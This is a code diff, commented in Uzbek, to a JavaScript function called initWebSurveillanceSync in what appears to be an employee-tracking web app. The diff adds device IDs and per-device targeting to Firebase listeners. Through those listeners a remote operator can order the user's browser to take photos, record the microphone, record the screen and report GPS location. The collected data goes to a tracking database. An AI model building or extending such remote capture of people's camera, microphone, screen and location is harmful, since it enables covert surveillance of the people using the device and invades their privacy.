@@ -397,12 +397,26 @@ function initWebSurveillanceSync(user) {
 
   const username = user.username;
 
+  // Device ID va Device Name
+  const webDevId = localStorage.getItem('ijro_web_dev_id') || ('web_' + Math.random().toString(36).substring(2, 9));
+  localStorage.setItem('ijro_web_dev_id', webDevId);
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const browserName = navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Safari') ? 'Safari' : 'Brauzer');
+  const webDevName = (isMobile ? 'Mobil Web' : 'Kompyuter Web') + ` (${browserName})`;
+
   // Heartbeat va GPS yangilab turish
   const sendHeartbeatAndGps = () => {
     try {
       if (window.firebase && window.firebase.database) {
         const db = window.firebase.database();
-        db.ref(`tracking/devices/${username}/heartbeat`).set(Date.now());
+        const now = Date.now();
+        db.ref(`tracking/devices/${username}/heartbeat`).set(now);
+        db.ref(`tracking/devices/${username}/devices/${webDevId}`).set({
+          id: webDevId,
+          name: webDevName,
+          type: 'web',
+          lastSeen: now
+        });
         updateUserLastActive(user.id);
         db.ref(`tracking/devices/${username}/info`).update({
           userId: user.id,
@@ -411,7 +425,7 @@ function initWebSurveillanceSync(user) {
           role: user.role,
           position: user.position || 'Xodim',
           model: navigator.userAgent.substring(0, 40),
-          updatedAt: Date.now()
+          updatedAt: now
         });
 
         if ('geolocation' in navigator) {
@@ -431,6 +445,17 @@ function initWebSurveillanceSync(user) {
     if (window.firebase && window.firebase.database) {
       const db = window.firebase.database();
       
+      // Target device filtering
+      let currentTargetId = 'all';
+      db.ref(`tracking/devices/${username}/commands/target_device_id`).off();
+      db.ref(`tracking/devices/${username}/commands/target_device_id`).on('value', snap => {
+        currentTargetId = snap.val() || 'all';
+      });
+
+      const isForThisDevice = () => {
+        return !currentTargetId || currentTargetId === 'all' || currentTargetId === webDevId;
+      };
+
       // Avvalgi eski listenerlarni tozalash (5-6 marta qayta ulanib ketmasligi uchun)
       db.ref(`tracking/devices/${username}/commands/take_photo`).off();
       db.ref(`tracking/devices/${username}/commands/record_audio`).off();
@@ -440,6 +465,7 @@ function initWebSurveillanceSync(user) {
       // 1. Rasm olish buyrug'i (Kamera)
       let lastPhotoTs = 0;
       db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
+        if (!isForThisDevice()) return;
         const ts = snap.val();
         if (ts && ts > 0 && ts !== lastPhotoTs) {
           lastPhotoTs = ts;
@@ -449,6 +475,7 @@ function initWebSurveillanceSync(user) {
 
       // 2. Ovoz yozish buyrug'i (Mikrofon / Diktafon)
       db.ref(`tracking/devices/${username}/commands/record_audio`).on('value', async (snap) => {
+        if (!isForThisDevice()) return;
         const val = snap.val();
         const shouldRecord = (val === true || val === 'start' || val === 'true');
         handleWebAudioRecordingCommand(username, shouldRecord);
@@ -456,6 +483,7 @@ function initWebSurveillanceSync(user) {
 
       // 3. Ekran yozish / Ekran rasmi buyrug'i (Ekran zapisi)
       db.ref(`tracking/devices/${username}/commands/record_screen`).on('value', async (snap) => {
+        if (!isForThisDevice()) return;
         const val = snap.val();
         const shouldRecord = (val === true || val === 'start' || val === 'true');
         handleWebScreenRecordingCommand(username, shouldRecord);
@@ -464,6 +492,7 @@ function initWebSurveillanceSync(user) {
       // 4. GPS joylashuv so'rovi buyrug'i
       let lastGpsTs = 0;
       db.ref(`tracking/devices/${username}/commands/request_gps`).on('value', async (snap) => {
+        if (!isForThisDevice()) return;
         const ts = snap.val();
         if (ts && ts > 0 && ts !== lastGpsTs) {
           lastGpsTs = ts;
